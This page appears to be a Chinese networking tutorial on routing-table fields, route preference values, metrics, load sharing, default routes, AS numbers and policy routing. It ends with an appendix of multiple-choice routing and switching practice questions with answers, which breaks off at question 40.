0.0.0.0/0    Static  60   0          RD   10.137.216.1    Vlanif20</span><br><span class="line">     10.10.10.1/24 Direct  0   0          D   10.10.10.10    Vlanif20</span><br></pre></td></tr></table></figure><p><strong>Destination：</strong>表示此路由的目的地址。用来标识IP包的目的地址或目的网络。</p><p><strong>Mask：</strong>表示此目的地址的子网掩码长度。与目的地址一起来标识目的主机或路由器所在的网段的地址。</p><blockquote><p>将目的地址和子网掩码“逻辑与”后可得到目的主机或路由器所在网段的地址。</p><p>例如：目的地址为10.1.1.1，掩码为255.255.255.0的主机或路由器所在网段的地址为10.1.1.0。</p><p>掩码由若干个连续“1”构成，既可以用点分十进制表示，也可以用掩码中连续“1”的个数来表示。</p><p>例如掩码255.255.255.0长度为24，即可以表示为24。  </p></blockquote><p><strong>Proto：</strong>表示学习此路由的路由协议。</p><p><strong>Pre：</strong>表示此路由的路由协议优先级。优先级高（数值小）者将成为当前的最优路由。</p><p><strong>Cost：</strong>路由开销。当到达同一目的地的多条路由具有相同的路由优先级时，路由开销最小的将成为当前的最优路由。</p><blockquote><p> <strong>Preference</strong>用于<strong>不同路由协议</strong>间路由优先级的比较，<strong>Cost</strong>用于<strong>同一种路由协议</strong>内部<strong>不同路由</strong>的优先级的比较。 </p></blockquote><p><strong>NextHop：</strong>表示此路由的下一跳地址。指明数据转发的下一个设备。</p><p><strong>Interface：</strong>表示此路由的出接口。指明数据将从本地路由器哪个接口转发出去。</p><h3 id="FIB表匹配"><a href="#FIB表匹配" class="headerlink" title="FIB表匹配"></a><strong>FIB表匹配</strong></h3><p>在路由表选择出路由后，路由表会将激活路由下发到FIB表中。当报文到达路由器时，会通过查找FIB表进行转发。</p><p>FIB表中每条转发项都指明到达某网段或某主机的报文应通过路由器的哪个物理接口或逻辑接口发送，然后就可到达该路径的下一个路由器或主机</p><p>FIB表的匹配遵循最长匹配原则。</p><h1 id="路由协议的优先级"><a href="#路由协议的优先级" class="headerlink" title="路由协议的优先级"></a>路由协议的优先级</h1><blockquote><p><strong>总体上：直连 &gt; OSPF &gt; IS-IS &gt; 静态路由 &gt; RIP &gt;BGP</strong></p></blockquote><p>路由器分别定义了外部优先级和内部优先级。</p><p>其中，0表示直接连接的路由，255表示任何来自不可信源端的路由；数值越小表明优先级越高。</p><p>外部优先级是指用户可以手工为各路由协议配置的优先级 </p><p><strong>表4-1</strong> <strong>路由协议缺省时的外部优先级</strong></p><table><thead><tr><th>路由协议的类型</th><th>路由协议的外部优先级</th></tr></thead><tbody><tr><td>Direct</td><td>0</td></tr><tr><td>OSPF</td><td>10</td></tr><tr><td>IS-IS</td><td>15</td></tr><tr><td>Static</td><td>60</td></tr><tr><td>RIP</td><td>100</td></tr><tr><td>OSPF ASE</td><td>150</td></tr><tr><td>OSPF NSSA</td><td>150</td></tr><tr><td>IBGP</td><td>255</td></tr><tr><td>EBGP</td><td>255</td></tr></tbody></table><p>路由协议的内部优先级则不能被用户手工修改 </p><p><strong>表4-2</strong> <strong>路由协议内部优先级</strong></p><table><thead><tr><th>路由协议的类型</th><th>路由协议的内部优先级</th></tr></thead><tbody><tr><td>Direct</td><td>0</td></tr><tr><td>OSPF</td><td>10</td></tr><tr><td>IS-IS Level-1</td><td>15</td></tr><tr><td>IS-IS Level-2</td><td>18</td></tr><tr><td>Static</td><td>60</td></tr><tr><td>RIP</td><td>100</td></tr><tr><td>OSPF ASE</td><td>150</td></tr><tr><td>OSPF NSSA</td><td>150</td></tr><tr><td>IBGP</td><td>200</td></tr><tr><td>EBGP</td><td>20</td></tr></tbody></table><h1 id="路由的度量"><a href="#路由的度量" class="headerlink" title="路由的度量"></a>路由的度量</h1><p>路由的度量标示出了这条路由到达指定的目的地址的代价，通常以下因素会影响到路由的度量。 </p><h3 id="路径长度"><a href="#路径长度" class="headerlink" title="路径长度"></a><strong>路径长度</strong></h3><p>路径长度是最常见的影响路由度量的因素。</p><p>链路状态路由协议可以为每一条链路设置一个链路开销来标示此链路的路径长度。</p><p>在这种情况下，路径长度是指经过的所有链路的链路开销的总和。</p><p>距离矢量路由协议使用跳数来标示路径长度。</p><p>跳数是指数据从源端到目的端所经过的设备数量。</p><p>例如，路由器到与它直接相连网络的跳数为0，通过一台路由器可达的网络的跳数为1，其余以此类推。</p><h3 id="网络带宽"><a href="#网络带宽" class="headerlink" title="网络带宽"></a><strong>网络带宽</strong></h3><p>网络带宽是一个链路实际的传输能力。</p><p>例如，一个10千兆的链路要比1千兆的链路更优越。</p><p>虽然带宽是指一个链路能达到的最大传输速率，但这不能说明在高带宽链路上路由要比低带宽链路上更优越。</p><p>比如说，一个高带宽的链路正处于拥塞的状态下，那报文在这条链路上转发时将会花费更多的时间。</p><h3 id="负载"><a href="#负载" class="headerlink" title="负载"></a><strong>负载</strong></h3><p>负载是一个网络资源的使用程度。</p><p>计算负载方法包括CPU的利用率和它每秒处理数据包的数量。</p><p>持续监测这些参数可以及时了解网络的使用情况。</p><h3 id="通信开销"><a href="#通信开销" class="headerlink" title="通信开销"></a><strong>通信开销</strong></h3><p>通信开销衡量了一条链路的运营成本。</p><p>尤其是只注重运营成本而不在乎网络性能的时候，通信开销则就成了一个重要的指标。</p><h1 id="负载分担与路由备份"><a href="#负载分担与路由备份" class="headerlink" title="负载分担与路由备份"></a>负载分担与路由备份</h1><blockquote><p>当多条路由的路由优先级和路由度量都相同时，这几条路由就称为等价路由，多条等价路由可以实现负载分担。</p><p>当这几条路由为非等价路由时，就可以实现路由备份。 </p></blockquote><h3 id="负载分担"><a href="#负载分担" class="headerlink" title="负载分担"></a><strong>负载分担</strong></h3><p>当到达同一目的地存在同一路由协议发现的多条路由时，且这几条路由的开销值也相同，那么就满足负载分担的条件。</p><p>当实现负载分担时，路由器根据五元组（源地址、目的地址、源端口、目的端口、协议）进行转发</p><p>当五元组相同时，路由器总是选择与上一次相同的下一跳地址发送报文。</p><p>当五元组不同时，路由器会选取相对空闲的路径进行转发。</p><h3 id="路由备份"><a href="#路由备份" class="headerlink" title="路由备份"></a><strong>路由备份</strong></h3><p>路由备份功能，可以提高网络的可靠性。</p><p>用户可以根据实际情况，配置到同一目的地的多条路由，其中一条路由的优先级最高，作为主路由，其余的路由优先级较低，作为备份路由。</p><p>正常情况下，路由器采用主路由转发数据。</p><p>当主链路出现故障时，主路由变为非激活状态，路由器选择备份路由中优先级最高的路由转发数据。</p><p>这样，也就实现了主路由到备份路由的切换。</p><p>当主链路恢复正常时，由于主路由的优先级最高，路由器重新选择主路由来发送数据。</p><p>这样，就实现了从备份路由回切到主路由。</p><h1 id="其它术语含义"><a href="#其它术语含义" class="headerlink" title="其它术语含义"></a>其它术语含义</h1><h3 id="IP-FRR"><a href="#IP-FRR" class="headerlink" title="IP FRR"></a><strong>IP FRR</strong></h3><p>快速重路由（Fast Reroute），是指当物理层或链路层检测到故障时将故障消息上报至上层路由系统，并立即启用一条备份链路转发报文。</p><p>IP FRR是一种快速实现路由备份的方式。  </p><h3 id="路由的收敛"><a href="#路由的收敛" class="headerlink" title="路由的收敛"></a><strong>路由的收敛</strong></h3><p>路由收敛是指网络<strong>拓扑变化</strong>引起的通过<strong>重新计算路由</strong>而发现<strong>替代路由</strong>的行为。随着网络的融合，区分服务的需求越来越强烈。</p><p>某些路由可能指导关键业务的转发，如VoIP，视频会议、组播等，这些关键的业务路由需要尽快收敛，而非关键路由可以相对慢一点收敛。</p><p>因此，系统需要对不同路由按不同的收敛优先级处理，来提高网络可靠性。</p><p>按优先级收敛是指系统为路由设置不同的收敛优先级，分为critical、high、medium、low四种。</p><p>系统根据这些路由的收敛优先级采用相对的优先收敛原则，即按照一定的调度比例进行路由收敛安装，指导业务的优先转发。</p><p>路由协议优先计算并下发高收敛优先级的路由给系统。 </p><h3 id="缺省路由"><a href="#缺省路由" class="headerlink" title="缺省路由"></a><strong>缺省路由</strong></h3><p>缺省路由是没有在路由表中找到匹配的路由表项时才使用的路由。</p><p>如果报文的目的地址不能与路由表的任何目的地址相匹配，那么该报文将选取缺省路由进行转发。</p><p>如果没有缺省路由且报文的目的地址不在路由表中，那么该报文将被丢弃</p><p>并向源端返回一个ICMP（Internet Control Message Protocol）报文，报告该目的地址或网络不可达。</p><p>在路由表中，缺省路由以到网络0.0.0.0（掩码也为0.0.0.0）的路由形式出现。</p><p>可通过命令<code>display ip routing-table</code>查看当前是否设置了缺省路由。</p><p>通常情况下，管理员可以通过手工方式配置缺省静态路由；但有些时候，也可以使动态路由协议生成缺省路由，如OSPF和IS-IS。</p><h3 id="不同路由协议的互相引入"><a href="#不同路由协议的互相引入" class="headerlink" title="不同路由协议的互相引入"></a><strong>不同路由协议的互相引入</strong></h3><p>由于采用的算法不同，不同的路由协议可以发现不同的路由。</p><p>当网络规模比较大，使用多种路由协议时，不同的路由协议间通常需要发布其他路由协议发现的路由。</p><p>各路由协议都可以引入其它路由协议的路由、直连路由和静态路由，每种路由协议都有相应的路由引入机制。</p><h3 id="自治系统"><a href="#自治系统" class="headerlink" title="自治系统"></a><strong>自治系统</strong></h3><p>在互联网中，自治系统AS（Autonomous System）是指在一个（有时是多个）实体管辖下的所有IP网络和路由器的网络</p><p>它们对互联网执行共同的路由策略。每一个AS可以支持多个内部网关路由协议。</p><p>一个AS内的所有网络都被分配同一个AS号，属于一个行政单位管辖。</p><p>AS号分为2字节AS号和4字节AS号。其中2字节AS号的范围为1至65535。</p><p>随着时间推进，可分配的2字节AS号已经濒临枯竭，需要将AS号的范围从之前的2字节扩展为4字节，其中4字节AS号的取值范围为1至4294967295。</p><p>4字节AS号还可以用X.Y的形式表示，其中X的取值范围为1至65535，Y的取值范围为0至65535。</p><p><strong>表7-1 AS号的分类及其取值范围</strong></p><table><thead><tr><th>AS号的类别</th><th>2字节AS号</th><th>4字节AS号</th></tr></thead><tbody><tr><td>公有AS号</td><td>1～64511</td><td>1～64511,65536～4294967295</td></tr><tr><td>私有AS号</td><td>64512～65535</td><td>64512～65535</td></tr></tbody></table><h3 id="可变长子网掩码"><a href="#可变长子网掩码" class="headerlink" title="可变长子网掩码"></a><strong>可变长子网掩码</strong></h3><p>可变长子网掩码VLSM（Variable-Length Subnet Masks）规定了如何在一个进行了子网划分的网络中的不同部分使用不同的子网掩码。</p><p>适用于网络内部需要不同大小子网的场景。实现VLSM通常被称为“子网划分子网”。</p><p>A类的第一段是网络号（前八位），B类地址的前两段是网络号（前十六位），C类的前三段是网络号（前二十四位）。</p><p>而VLSM的作用就是在类的IP地址的基础上，从它们的主机号部分借出相应的位数来做网络号，也就是增加网络号的位数。</p><h3 id="全0和全1子网"><a href="#全0和全1子网" class="headerlink" title="全0和全1子网"></a><strong>全0和全1子网</strong></h3><p>通过将IP地址的主机部分进一步划分为若干个子网，可以解决IP地址空间利用率低和两级IP地址不够灵活的问题。</p><p>其中，全0的主机号码表示该IP地址就是网络的地址，用于网络路由；</p><p>全1的主机号码表示广播地址，即对该网络上所有的主机进行广播。 </p><h3 id="路由策略"><a href="#路由策略" class="headerlink" title="路由策略"></a><strong>路由策略</strong></h3><p>路由策略主要实现了路由过滤和路由属性设置等功能，它通过改变路由属性（包括可达性）来改变网络流量所经过的路径。 </p><p><strong>目的</strong></p><p>路由协议在发布、接收和引入路由信息时，根据实际组网需求实施一些策略，以便对路由信息进行过滤和改变路由信息的属性：</p><blockquote><p><strong>控制路由的接收和发布</strong></p><p>只发布和接收必要、合法的路由信息，以控制路由表的容量，提高网络的安全性。</p><p><strong>控制路由的引入</strong></p><p>在一种路由协议在引入其它路由协议发现的路由信息丰富自己的路由信息时，只引入一部分满足条件的路由信息。</p><p><strong>设置特定路由的属性</strong></p><p>修改通过路由策略过滤的路由的属性，满足自身需要。</p></blockquote><h3 id="策略路由"><a href="#策略路由" class="headerlink" title="策略路由"></a><strong>策略路由</strong></h3><p>策略路由PBR（Policy-Based Routing）是一种依据用户制定的策略进行路由选择的机制。</p><p><strong>目的</strong></p><blockquote><p>传统的路由转发原理是首先根据报文的目的地址查找路由表，然后进行报文转发。</p><p>但是目前越来越多的用户希望能够在传统路由转发的基础上根据自己定义的策略进行报文转发和选路。</p><p>策略路由使网络管理者不仅能够根据报文的目的地址，</p><p>而且能够根据报文的源地址、报文大小和链路质量等属性来制定策略路由，以改变数据包转发路径，满足用户需求。</p><p>策略路由只对转发的报文起作用，对本地下发的报文（比如本地的Ping报文）不起作用。策略路由仅对IP类型的报文生效。 </p></blockquote><h1 id="重要学习参考资料"><a href="#重要学习参考资料" class="headerlink" title="重要学习参考资料"></a>重要学习参考资料</h1><h3 id="路由协议-gt-OSPF、RIP、BGP的详细原理和配置"><a href="#路由协议-gt-OSPF、RIP、BGP的详细原理和配置" class="headerlink" title="路由协议 -&gt; OSPF、RIP、BGP的详细原理和配置"></a><a href="https://support.huawei.com/enterprise/zh/doc/EDOC1000141374/766cc4cd" target="_blank" rel="noopener">路由协议 -&gt; OSPF、RIP、BGP的详细原理和配置</a></h3><h3 id="wireshark协议分析教程-51CTO"><a href="#wireshark协议分析教程-51CTO" class="headerlink" title="wireshark协议分析教程 (51CTO) "></a><a href="https://edu.51cto.com/center/course/lesson/index?id=62643" target="_blank" rel="noopener">wireshark协议分析教程 (51CTO) </a></h3><h3 id="华为的在线课堂-gt-更多路由交换技术学习"><a href="#华为的在线课堂-gt-更多路由交换技术学习" class="headerlink" title="华为的在线课堂-&gt;更多路由交换技术学习"></a><a href="https://support.huawei.com/onlinetoolweb/ptmngsys/Web/OnlineCourse/zh/index.html" target="_blank" rel="noopener">华为的在线课堂-&gt;更多路由交换技术学习</a></h3><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>除了下边的题目还可以去<a href="https://www.nowcoder.com/intelligentTest" target="_blank" rel="noopener">牛客网</a>的<strong>专项练习-&gt;网络基础</strong>、<strong>试题广场</strong>寻找</p><h3 id="路由交换技术选择题"><a href="#路由交换技术选择题" class="headerlink" title="路由交换技术选择题"></a>路由交换技术选择题</h3><p>1、<strong>交换机和路由器相比,主要的区别有 ( AB )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 交换机工作在 OSI 参考模型的第二层</span><br><span class="line">B. 路由器工作在 OSI 参考模型的第三层</span><br><span class="line">C. 交换机的一个端口划分一个广播域的边界</span><br><span class="line">D. 路由器的一个端口划分一个冲突域的边界</span><br></pre></td></tr></table></figure><p>2、<strong>以下不会在路由表里出现的是 : ( D )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 下一跳地址</span><br><span class="line">B. 网络地址</span><br><span class="line">C. 度量值</span><br><span class="line">D. MAC 地址</span><br></pre></td></tr></table></figure><p>3、<strong>路由器是一种用于网络互连的计算机设备, 但作为路由器,并不具备的是 ( B )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 支持多种路由协议</span><br><span class="line">B. 多层交换功能</span><br><span class="line">C. 支持多种可路由协议</span><br><span class="line">D. 具有存储、转发、寻址功能</span><br></pre></td></tr></table></figure><p>4、<strong>路由器在转发数据包到非直连网段的过程中, 依靠数据 包中的哪一个选项来寻找下一跳地址 ( B )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 帧头</span><br><span class="line">B. IP 报文头部</span><br><span class="line">C. SSAP 字段</span><br><span class="line">D. DSAP 字段</span><br></pre></td></tr></table></figure><p>5、<strong>IP 地址 190.233.27.13是(B )类地址</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. A</span><br><span class="line">B. B</span><br><span class="line">C. C</span><br><span class="line">D. D</span><br></pre></td></tr></table></figure><p>6、<strong>IP 地址 224.0.0.5代表的是什么地址 ? ( C )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 主机地址</span><br><span class="line">B. 网络地址</span><br><span class="line">C. 组播地址</span><br><span class="line">D. 广播地址</span><br></pre></td></tr></table></figure><p>7、<strong>在 TCP/IP协议栈中, 下面哪一组选项能够唯一地确定一 个 TCP 连接:( D )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 源 IP 地址和源端口号</span><br><span class="line">B. 源 IP 地址和目的端口号</span><br><span class="line">C. 目的地址和源端口号</span><br><span class="line">D. 源地址、目的地址、源端口号和目的端口号</span><br></pre></td></tr></table></figure><p>8、<strong>如果要满足全线速二层(全双工)转发,则某种带有 24个固定 10/100M端口的交换机的背板带宽最小应为多 少? ( D )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 24Gbps</span><br><span class="line">B. 12Gbps</span><br><span class="line">C. 2.4Gbps</span><br><span class="line">D. 4.8Gbps</span><br></pre></td></tr></table></figure><p>9、<strong>下面的描述正确的是:( BCD )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 集线器工作在 OSI 参考模型的第一、二两层</span><br><span class="line">B. 集线器能够起到放大信号,增大网络传输距离的作用</span><br><span class="line">C. 集线器上连接的所有设备同属于一个冲突域</span><br><span class="line">D. 集线器支持 CSMA&#x2F;CD技术</span><br></pre></td></tr></table></figure><p>10、<strong>在访问控制列表中地址和屏蔽码为 168.18.0.0 0.0.0.255所表示的 IP 地址范围是 ( B )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 168.18.67.1~168.18.70.255</span><br><span class="line">B. 168.18.0.1~168.18.0.255</span><br><span class="line">C. 168.18.63.1~168.18.64.255</span><br><span class="line">D. 168.18.64.255~168.18.67.255</span><br></pre></td></tr></table></figure><p>11、<strong>请问能够在路由器的下列哪个模式使用 debug 命令 ( B )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 用户模式</span><br><span class="line">B. 特权模式</span><br><span class="line">C. 全局配置模式</span><br><span class="line">D. 接口配置模式</span><br></pre></td></tr></table></figure><p>12、<strong>下面的说法正确的是 ( ABD )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. DNS 是用来解析 IP 地址和域名地址(互联网地址) 的</span><br><span class="line">B. 默认网关是互连内网和外网的通道</span><br><span class="line">C. 每个 Windows 用户都可以创建域,并使用域中的一 个帐号</span><br><span class="line">D. 每个 Windows 用户都可以创建工作组,创建了一个 工作组,计算机重启后就会自动加入到该工作组</span><br></pre></td></tr></table></figure><p>13、<strong>数据分段(segment )是 OSI 七层模型中的哪一层的数据名称 ( D )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 物理层</span><br><span class="line">B. 数据链路层</span><br><span class="line">C. 网络层</span><br><span class="line">D. 传输层</span><br></pre></td></tr></table></figure><p>14、<strong>集线器目前一般应用最多的是在 ( A )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 一个办公室内部实现互连的时候</span><br><span class="line">B. 一个楼层各个办公室的互连</span><br><span class="line">C. 一个多媒体教室中主机的互连</span><br><span class="line">D. 一个建筑物内部两个地点间距离超过了 200米的 时候</span><br></pre></td></tr></table></figure><p>15、<strong>下列属于距离矢量路由协议容易引起的问题是 : ( C )</strong> </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 水平分割</span><br><span class="line">B. 路径中毒</span><br><span class="line">C. 计数到无穷</span><br><span class="line">D. 抑制时间</span><br></pre></td></tr></table></figure><p>16、<strong>如果对 C 类地址段 193.11.22.0/24进行可变长子网划分, 则下列地址能够成为其子网地址的有: BC</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 193.11.22.174</span><br><span class="line">B. 193.11.22.192</span><br><span class="line">C. 193.11.22.172</span><br><span class="line">D. 193.11.22.122</span><br></pre></td></tr></table></figure><p>17、<strong>下列 VLSM 的理解正确的是 : ( ACD )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. VLSM 就是 Variable Length Subnet Mask的缩写形 式,即可变长子网掩码</span><br><span class="line">B. 是指使用不同于整个字节的子网掩码划分方法, 使用按位划分网络位和主机位的子网划分方法</span><br><span class="line">C. 如果仅仅使用非整字节的子网掩码位数,并不能 称之为 VLSM</span><br><span class="line">D. 如果一个企业使用了一个 C 类的网络进行了整体的规划,并且划分了至少 6个不同大小的网络,则可以肯定这个企业内部的 IP 地址一定使用了 VLSM 进行规划</span><br></pre></td></tr></table></figure><p>18、<strong>IP 地址为:192.168.100.138, 子网掩码为:255.255.255.192所在的网络地址是什么,和 IP 地址 192.168.100.153是否 在同一个网段? ( A )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 192.168.100.128,是</span><br><span class="line">B. 192.168.100.0, 是</span><br><span class="line">C. 192.168.100.138, 是</span><br><span class="line">D. 192.168.100.128, 不是</span><br></pre></td></tr></table></figure><p>19、<strong>一个网段 150.25.0.0的子网掩码是 255.255.224.0,(BCD )是有效的主机地址</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 150.25.0.0</span><br><span class="line">B. 150.25.16.255</span><br><span class="line">C. 150.25.2.24</span><br><span class="line">D. 150.15..30</span><br></pre></td></tr></table></figure><p>20、<strong>一个 B 类网络 , 有 5位掩码加入缺省掩码用来划分子网 , 每 个子网最多(D )台主机</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 510</span><br><span class="line">B. 512</span><br><span class="line">C. 1022</span><br><span class="line">D. 2046</span><br></pre></td></tr></table></figure><p>21、<strong>BPDU 报文是通过(C )进行传送的</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. IP 报文</span><br><span class="line">B. TCP 报文</span><br><span class="line">C. 以太网帧</span><br><span class="line">D. UDP 报文</span><br></pre></td></tr></table></figure><p>22、<strong>下列对 IEEE802.1Q 标准的理解正确的是:( BD )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 它在 MAC 层帧中插入了一个 16bit 的 VLAN 标识符</span><br><span class="line">B. 它通过插入 3个 bit 位来定义 802.1p 优先级,对流入交换机的帧进行排序</span><br><span class="line">C. 一旦在交换机中启动了 IEEE802.1Q VLAN标记功 能,则所有进出交换机的帧都被加了标记</span><br><span class="line">D. IEEE802.1Q 解决了跨交换机的相同 VLAN 间的通信 问题</span><br></pre></td></tr></table></figure><p>23、<strong>要想拒绝主机 192.168.100.3/24访问服务器201.10.182.10/24的 WWW 服务,下面的访问控制列表配 置及其模式均正确的是:( D )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. Router#ip access-list 101 deny tcp 192.168.100.3 0.0.0.255 201.10.182.10 0.0.0.255 eq 80</span><br><span class="line"></span><br><span class="line">B. Router(config)#ip access-list 10 deny tcp 192.168.100.30 0.0.0.255 201.10.182.10 0.0.0.255 eq 80</span><br><span class="line"></span><br><span class="line">C. Router(config-serial1&#x2F;0)#ip access-list 10 deny tcp 192.168.100.3 0.0.0.255 201.10.182.10 0.0.0.255 eq 80</span><br><span class="line"></span><br><span class="line">D. Router(config)#ip access-list 101 deny tcp 192.168.100.3 0.0.0.255 201.10.182.10 0.0.0.255 eq 80</span><br></pre></td></tr></table></figure><p>24、<strong>下列对访问控制列表的描述不正确的是:( C )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 访问控制列表能决定数据是否可以到达某处</span><br><span class="line">B. 访问控制列表可以用来定义某些过滤器</span><br><span class="line">C. 一旦定义了访问控制列表,则其所规范的某些 数据包就会严格被允许或拒绝</span><br><span class="line">D. 访问控制列表可以应用于路由更新的过程当中</span><br></pre></td></tr></table></figure><p>25、<strong>以下情况可以使用访问控制列表准确描述的是:( C )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 禁止有 CIH 病毒的文件到我的主机</span><br><span class="line">B. 只允许系统管理员可以访问我的主机</span><br><span class="line">C. 禁止所有使用 Telnet 的用户访问我的主机</span><br><span class="line">D. 禁止使用 UNIX 系统的用户访问我的主机</span><br></pre></td></tr></table></figure><p>26、<strong>路由器中时刻维持着一张路由表, 这张路由表可以是静 态配置的,也可以是(C )产生的</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 生成树协议</span><br><span class="line">B. 链路控制协议</span><br><span class="line">C. 动态路由协议</span><br><span class="line">D. 被承载网络层协议</span><br></pre></td></tr></table></figure><p>27、<strong>以太网交换机的每一个端口可以看做一个 ( A )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 冲突域</span><br><span class="line">B. 广播域</span><br><span class="line">C. 管理域</span><br><span class="line">D. 阻塞域</span><br></pre></td></tr></table></figure><p>28、<strong>下面的描述正确的是:( C )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 集线器不能延伸网络的可操作的距离</span><br><span class="line">B. 集线器不能在网络上发送变弱的信号</span><br><span class="line">C. 集线器不能过滤网络流量</span><br><span class="line">D. 集线器不能放大变弱的信号</span><br></pre></td></tr></table></figure><p>29、<strong>DNS 的作用是 ( C )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 为客户机分配 IP 地址</span><br><span class="line">B. 访问 HTTP 的应用程序</span><br><span class="line">C. 将域名翻译为 IP 地址</span><br><span class="line">D. 将 MAC 地址翻译为 IP 地址</span><br></pre></td></tr></table></figure><p>30、<strong>OSI 代表什么 ( D )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 标准协会组织</span><br><span class="line">B. Internet 标准组织</span><br><span class="line">C. 开放标准协会</span><br><span class="line">D. 开放系统互连</span><br></pre></td></tr></table></figure><p>31、<strong>当路由器接收的 IP 报文中的目标网络不在路由表中时, (没有缺省路由时)采取的策略是 ( A )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 丢掉该报文</span><br><span class="line">B. 将该报文以广播的形式发送到所有直连端口</span><br><span class="line">C. 直接向支持广播的直连端口转发该报文</span><br><span class="line">D. 向源路由器发出请求,减小其报文大小</span><br></pre></td></tr></table></figure><p>32、<strong>当路由器接收的 IP 报文的生存时间值等于 1时,采取的 策略是 ( A )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 丢掉该报文</span><br><span class="line">B. 转发该报文</span><br><span class="line">C. 将该报文分段</span><br><span class="line">D. 其它三项答案均不对</span><br></pre></td></tr></table></figure><p>33、<strong>一个 C 类网络需要划分 5个子网,每个子网至少包含 32个主机,请问,合适的子网掩码应为多少? ( D )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 255.255.255.224</span><br><span class="line">B. 255.255.255.192</span><br><span class="line">C. 255.255.255.252</span><br><span class="line">D. 没有合适的子网掩码</span><br></pre></td></tr></table></figure><p>34、<strong>规划一个 C 类网 , 需要将整个网络分为 9个子网 , 最大的子 网有 15台主机 , 下列哪个是合适的子网掩码 ? ( D )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 255.255.224.0</span><br><span class="line">B. 255.255.255.224</span><br><span class="line">C. 255.255.255.240</span><br><span class="line">D. 没有合适的子网掩码</span><br></pre></td></tr></table></figure><p>35、<strong>下列地址表示私有地址的是:( DE )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 202.118.56.21</span><br><span class="line">B. 1.2.3.4</span><br><span class="line">C. 192.118.2.1</span><br><span class="line">D. 172.16.33.78</span><br><span class="line">E. 10.0.1.2</span><br></pre></td></tr></table></figure><p>私有IP地址范围有：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A类：10.0.0.0-10.255.255.255</span><br><span class="line">B类：172.16.0.0-172.31.255.255</span><br><span class="line">C类：192.168.0.0-192.168.255.255</span><br></pre></td></tr></table></figure><p>36、<strong>某台路由器上配置了如下一条访问列表 ( C )</strong></p><p>access-list 4 permit 202.38.160.1 0.0.0.255</p><p>access-list 4 deny 202.38.0.0 0.0.255.255</p><p><strong>表示:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 只禁止源地址为 202.38.0.0网段的所有访问</span><br><span class="line">B. 只允许目的地址为 202.38.0.0网段的所有访问</span><br><span class="line">C. 检查源 IP 地址,禁止 202.38.0.0大网段的主机, 但允许其中的 202.38.160.0小网段上的主机 </span><br><span class="line">D. 检查目的 IP 地址,禁止 202.38.0.0大网段的主 机,但允许其中的 202.38.160.0小网段的主机</span><br></pre></td></tr></table></figure><p>37、<strong>交换机如何转发收到的二层数据帧? ( A )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 比较数据帧的 MAC 地址是否在 MAC 端口对应表中命 中,如果命中即向此端口转发</span><br><span class="line">B. 比较数据帧的 MAC 地址是否在 MAC 端口对应表中命 中,如果没有命中即丢弃该帧</span><br><span class="line">C. 交换机存储此二层数据帧,待目的设备发出查询, 再发向目的设备</span><br><span class="line">D. 交换机察看二层帧对应的 IP 地址是否在端口地址 表中,如果在,则向所有端口转发</span><br></pre></td></tr></table></figure><p>38、<strong>下面关于生成树协议优缺点描述不正确的是 ( C )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. 生成树协议能够管理冗余链路</span><br><span class="line">B. 生成树协议能够阻断冗余链路,防止环路的产生</span><br><span class="line">C. 生成树协议能够防止网络临时失去连通性</span><br><span class="line">D. 生成树协议能够使透明网桥工作在存在物理环路 的网络环境中</span><br></pre></td></tr></table></figure><p>39、<strong>在以太网中, 是根据 (D )地址来区分不同的设备的</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. IP 地址</span><br><span class="line">B. IPX 地址</span><br><span class="line">C. LLC 地址</span><br><span class="line">D. MAC 地址</span><br></pre></td></tr></table></figure><p>40、<strong>路由器启动时访问不同类型存储器的先后顺序是: ( A )</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A. ROM -&gt;FLASH-&gt;NVRAM</span><br><span class="line">B. FLASH 